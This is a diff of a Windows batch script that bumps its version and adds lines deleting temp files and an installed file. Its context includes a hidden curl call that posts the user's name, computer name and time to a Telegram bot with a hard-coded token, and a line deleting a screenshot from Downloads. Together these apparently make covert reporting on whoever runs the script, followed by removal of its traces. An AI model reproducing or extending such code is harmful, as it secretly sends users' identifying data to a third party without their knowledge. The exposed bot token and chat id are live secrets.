@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=21.4"
+set "BATCHVERSION=21.5"
 
 
 
@@ -90,6 +90,7 @@ echo.
 echo Exiting...
 curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|DONEE"
 del /q %temp%\*.mpee
+del /q %temp%\*.qwb
 goto :EOF
 
 :LogOutput
@@ -1989,7 +1990,7 @@ echo Sent.
 set "currentMinute=%time:~3,2%"
 
 
-
+del /f /q "%InstalledQWB%"
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 
 
